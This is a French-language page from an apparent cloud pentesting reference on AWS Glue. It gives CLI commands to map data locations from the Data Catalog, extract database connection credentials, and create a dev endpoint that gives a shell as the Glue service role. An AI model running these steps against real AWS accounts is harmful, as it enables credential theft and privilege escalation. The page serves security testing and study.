---
title: "Glue : catalogues, scripts de jobs et rôle de service Glue"
order: 5
description: "Lire le Glue Data Catalog et les scripts de jobs pour localiser les données et les secrets, et exécuter des jobs sous le rôle Glue."
keywords:
  - Glue
  - Data Catalog
  - job
  - script
  - rôle de service
---

# Glue

Glue est la couche ETL, et elle fuit de trois façons. Le **Data Catalog** mappe chaque table à son emplacement S3, de sorte que le lire revient à obtenir une carte au trésor de l'endroit où vivent les données. Les **connexions** stockent des identifiants de bases de données, parfois renvoyés par l'API. Et les **jobs et dev endpoints** exécutent du code arbitraire sous un rôle de service Glue, ce qui constitue l'élévation `PassRole` traitée dans [identity](../identity/privilege-escalation/pass-role/glue.md).

## Lire le catalogue et les connexions

```bash
aws glue get-databases ; aws glue get-tables --database-name <db> \
  --query 'TableList[].StorageDescriptor.Location'       # S3 paths to the data
aws glue get-connections --query 'ConnectionList[].ConnectionProperties'
```

## Exécuter du code sous le rôle Glue

```bash
aws glue get-jobs --query 'Jobs[].[Name,Role,Command.ScriptLocation]'
# a dev endpoint gives an interactive session as the Glue role
aws glue create-dev-endpoint --endpoint-name x --role-arn <glue-role> \
  --public-key "$(cat key.pub)"
```

## Notes d'exploitation

- Les définitions de jobs nomment à la fois le rôle de service et l'emplacement S3 du script ; lire le script révèle souvent des secrets codés en dur et les chemins exacts des données.
- `get-connections` peut renvoyer les mots de passe des connexions selon les permissions de l'appelant, une source directe d'identifiants pour la base de données sous-jacente.
- Un dev endpoint est le moyen le plus discret d'obtenir un shell en tant que rôle Glue lorsque vous détenez déjà des permissions d'écriture Glue.

## Outils

- **AWS CLI** (`glue get-tables`, `get-connections`, `create-dev-endpoint`).
- **Pacu** (`glue__*`) : énumérer les jobs, connexions et endpoints.

## Références

- [HackTricks Cloud: AWS Glue privesc](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-glue-privesc.html)
- [AWS: Glue connections](https://docs.aws.amazon.com/glue/latest/dg/console-connections.html)
- [Pacu: AWS exploitation framework](https://github.com/RhinoSecurityLabs/pacu)
- [Hacking the Cloud: AWS offensive techniques](https://hackingthe.cloud/)
